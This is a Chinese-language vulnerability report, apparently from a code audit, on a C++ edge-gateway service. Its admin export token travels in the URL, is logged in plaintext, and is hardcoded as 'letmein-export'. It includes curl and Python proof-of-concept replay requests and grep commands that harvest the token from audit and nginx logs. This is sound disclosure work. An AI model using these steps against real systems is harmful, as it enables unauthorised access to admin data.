# VULN-SEC-MAIN-002: 管理员导出接口通过 GET 请求 URL 传递认证令牌，导致凭据多渠道泄露

**严重性**: High | **CWE**: CWE-598 (Information Exposure Through Query Strings in GET Request) | **置信度**: 85/100
**位置**: `src/main.cpp:70-73` @ `main (GET /admin/export lambda)`

---

## 1. 漏洞细节

`GET /admin/export` 路由将管理员认证令牌（token）作为 URL 查询参数传递。该令牌是访问管理导出功能的唯一凭据，用于授权敏感数据的导出操作。

此漏洞存在**双重暴露**问题：

1. **URL 明文暴露**：GET 请求的所有查询参数均完整出现在 URL 中。根据 HTTP 协议规范，URL 会被以下组件记录和传播：
   - Web 服务器访问日志（access log）
   - 反向代理和负载均衡器日志
   - 浏览器历史记录
   - 通过 `Referer` 头泄露给第三方资源
   - 网络监控设备和 IDS/IPS 系统
   - ISP 和网络中间节点的日志

2. **审计日志明文记录**：`audit.event("admin", "export", token)` 将令牌以明文形式写入审计日志文件 `edge-gateway.audit.log`（第 72 行）。审计日志通常被多个运维人员访问、备份和归档，进一步扩大了凭据的暴露面。

此外，`exportSnapshot()` 函数使用硬编码字符串 `"letmein-export"` 作为令牌校验值（`file_cache.cpp:22`），这意味着该令牌是静态的、永不过期的，一旦被泄露将长期有效。

## 2. 漏洞代码

**文件**: `src/main.cpp` (行 70-74)

```cpp
  server.route("GET", "/admin/export", [&](const HttpRequest& request) {
    std::string token = queryValue(request, "token");   // 行71: 从URL查询字符串提取令牌 [SOURCE]
    audit.event("admin", "export", token);               // 行72: 令牌明文写入审计日志 [SINK-1]
    return text(200, files.exportSnapshot(token));        // 行73: 令牌用于授权导出操作 [SINK-2]
  });
```

**辅助函数** `queryValue`（`src/main.cpp:13-16`）：

```cpp
std::string queryValue(const HttpRequest& request, const std::string& key) {
  auto found = request.query.find(key);
  return found == request.query.end() ? "" : found->second;
}
```

该函数直接从 `request.query` map 中取值，不做任何清洗或验证。`request.query` 由 `parseQuery()` 函数（`http_server.cpp:19-32`）从原始 HTTP 请求的 URL 查询字符串解析而来。

**审计日志写入**（`include/audit_log.hpp:11-15`）：

```cpp
void event(const std::string& user, const std::string& action, const std::string& detail) {
    out_ << std::time(nullptr) << " user=" << user
         << " action=" << action
         << " detail=" << detail << "\n";   // token 作为 detail 明文写入文件
}
```

**令牌校验逻辑**（`src/file_cache.cpp:21-31`）：

```cpp
std::string FileCache::exportSnapshot(const std::string& token) const {
  if (token != "letmein-export") {   // 硬编码静态令牌
    return "denied\n";
  }
  std::ostringstream out;
  out << "users=3\n";
  out << "last_backup=disabled\n";
  out << "data_dir=" << baseDir_ << "\n";
  return out.str();
}
```

**代码分析要点**：

- 第 71 行：令牌直接从 URL 查询参数提取，无任何传输层保护
- 第 72 行：令牌被完整记录到审计日志，日志文件可能被多人访问
- 第 73 行：令牌用于授权检查，但校验值为硬编码静态字符串
- 整个处理路径无任何条件分支阻断，数据流直达

## 3. 完整攻击链路

```
[攻击者发起请求]
  GET /admin/export?token=letmein-export HTTP/1.1
  ↓ HTTP 请求经过网络传输
[网络层暴露] URL 在传输过程中被中间节点记录
  ↓ 请求到达服务器
[HTTP 解析] parseRequest()@http_server.cpp:42-68
  ↓ 解析 URL 查询字符串，token 进入 request.query map
[令牌提取] queryValue(request, "token")@main.cpp:71
  ↓ 从 request.query["token"] 取出令牌值
[审计日志记录] audit.event("admin", "export", token)@main.cpp:72
  ↓ 令牌明文写入 edge-gateway.audit.log 文件
[授权检查] files.exportSnapshot(token)@main.cpp:73
  ↓ 与硬编码值 "letmein-export" 比较
[敏感数据返回] 返回系统快照数据
```

**攻击链路详细说明**：

1. **网络层暴露**：HTTP 请求的完整 URL（包含 `?token=letmein-export`）在传输过程中对所有中间网络设备可见。如果未使用 TLS，令牌以明文形式在网络上传输。
2. **服务器日志记录**：Web 服务器的访问日志会记录完整的请求 URL，包括查询参数。任何能访问日志文件的人都可以获取令牌。
3. **审计日志泄露**：`audit.event()` 将令牌作为 `detail` 字段写入 `edge-gateway.audit.log`，审计日志通常有较长的保留期且可能被多人访问。
4. **无阻断机制**：从 URL 解析到令牌使用，整个数据流路径无任何清洗、脱敏或验证步骤。

## 4. 攻击场景

**攻击者画像**: 任何能够访问服务器日志、审计日志、网络流量或浏览器历史记录的人员，包括运维人员、网络管理员、中间代理操作员，以及通过 Referer 头获取令牌的第三方。

**攻击向量**: 多渠道泄露——通过服务器访问日志、审计日志文件、浏览器历史记录、网络嗅探、Referer 头泄露等途径获取管理员令牌。

**利用难度**: 低

### 攻击步骤

1. **获取令牌**（以下任一途径均可）：
   - 读取服务器访问日志，搜索包含 `/admin/export` 的请求记录
   - 读取审计日志文件 `edge-gateway.audit.log`，提取 `detail=` 字段中的令牌值
   - 通过网络嗅探截获未加密的 HTTP 请求
   - 查看浏览器历史记录中的完整 URL
   - 通过 Referer 头泄露获取（如果导出页面包含外部资源链接）

2. **重放令牌**：使用获取到的令牌构造请求：
   ```
   GET /admin/export?token=letmein-export HTTP/1.1
   ```

3. **获取敏感数据**：服务器返回系统快照信息，包括用户数量、备份状态和数据目录路径。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                 |
| ---------- | -------------- | -------------------------------------------------------------------- |
| 网络可达性 | 需要网络访问   | 攻击者需要能够访问目标服务器的 8080 端口（默认端口）                  |
| 认证要求   | 无需认证       | 获取令牌本身不需要任何认证；令牌是静态硬编码的，无需动态获取          |
| 配置依赖   | 无特殊配置     | 该路由在默认启动时即注册，无需特殊配置触发                           |
| 环境依赖   | 标准 HTTP 环境 | 服务未使用 TLS 加密（原始 socket 实现），令牌在网络中明文传输         |
| 时序条件   | 无时序依赖     | 令牌为静态硬编码值，永不过期，任何时间均可利用                       |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                       |
| -------- | ---- | ------------------------------------------------------------------------------------------ |
| 机密性   | 高   | 管理员认证令牌通过多个渠道泄露；攻击者获取令牌后可访问管理导出功能，获取系统敏感信息         |
| 完整性   | 低   | 令牌泄露后攻击者可调用导出接口，虽然当前导出功能为只读，但泄露的令牌可能被用于进一步的攻击链 |
| 可用性   | 低   | 令牌泄露本身不直接影响服务可用性，但攻击者可能滥用导出功能造成资源消耗                       |

**影响范围**: 该漏洞影响管理导出功能的认证安全性。由于令牌是静态硬编码的（`"letmein-export"`），一旦泄露，所有拥有该令牌的人都可以无限制地调用管理导出接口。泄露渠道广泛（日志、网络、浏览器历史），影响面较大。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 直接利用令牌访问管理导出接口

```bash
# 使用已知的硬编码令牌直接调用导出接口
curl -v "http://TARGET_HOST:8080/admin/export?token=letmein-export"
```

**预期输出**:
```
users=3
last_backup=disabled
data_dir=data
```

### PoC 2: 从审计日志中提取令牌

```bash
# 读取审计日志文件，提取泄露的令牌
grep "action=export" edge-gateway.audit.log
# 输出示例: 1750233600 user=admin action=export detail=letmein-export
```

### PoC 3: 从服务器访问日志中提取令牌

```bash
# 在 Nginx/Apache 等反向代理的访问日志中搜索
grep "/admin/export" /var/log/nginx/access.log
# 输出示例: 192.168.1.100 - - [18/Jun/2026:10:00:00] "GET /admin/export?token=letmein-export HTTP/1.1" 200 52
```

### PoC 4: Python 自动化验证脚本

```python
#!/usr/bin/env python3
"""仅供安全测试使用 - 验证 CWE-598 凭据 URL 泄露漏洞"""
import requests
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

# 步骤 1: 使用硬编码令牌访问管理导出接口
url = f"{target}/admin/export?token=letmein-export"
print(f"[*] 请求 URL: {url}")
print(f"[*] 注意: 令牌 'letmein-export' 完整暴露在 URL 中")

response = requests.get(url)
print(f"[*] 响应状态码: {response.status_code}")
print(f"[*] 响应内容:\n{response.text}")

if response.status_code == 200 and "users=" in response.text:
    print("[!] 漏洞确认: 管理导出接口可通过 URL 中的令牌成功访问")
    print("[!] 令牌通过以下渠道泄露:")
    print("    - 服务器访问日志")
    print("    - 审计日志文件 (edge-gateway.audit.log)")
    print("    - 浏览器历史记录")
    print("    - 网络传输 (未加密)")
else:
    print("[-] 导出接口未返回预期数据")
```

**使用说明**: 启动目标服务后，运行 PoC 脚本验证令牌可通过 URL 传递并成功获取敏感数据。

**预期结果**: 攻击者无需任何认证即可通过 URL 中的令牌访问管理导出功能，获取系统快照数据。同时令牌会被记录在服务器日志和审计日志中。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ 或其他支持 C++17 的系统)
- 编译器: GCC 9+ 或 Clang 10+ (支持 C++17 标准)
- 构建工具: CMake 3.16+
- 依赖: 标准 C++ 库，无第三方依赖

### 构建步骤

```bash
cd /scan/project
mkdir -p build && cd build
cmake ..
make -j$(nproc)
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

服务启动后会在当前工作目录创建审计日志文件 `edge-gateway.audit.log`。

### 验证步骤

1. 启动服务：`./edge-gateway`
2. 在另一个终端发送请求：`curl "http://localhost:8080/admin/export?token=letmein-export"`
3. 验证返回了系统快照数据（包含 `users=3`、`last_backup=disabled` 等）
4. 检查审计日志：`cat edge-gateway.audit.log`，确认令牌被明文记录
5. 验证错误令牌被拒绝：`curl "http://localhost:8080/admin/export?token=wrong"`，应返回 `denied`

### 预期结果

- 正确令牌请求返回系统快照数据（HTTP 200）
- 审计日志中包含完整的令牌明文：`detail=letmein-export`
- 错误令牌请求返回 `denied`（HTTP 200，body 为 "denied\n"）
- 服务器访问日志（如有反向代理）记录完整的带令牌 URL
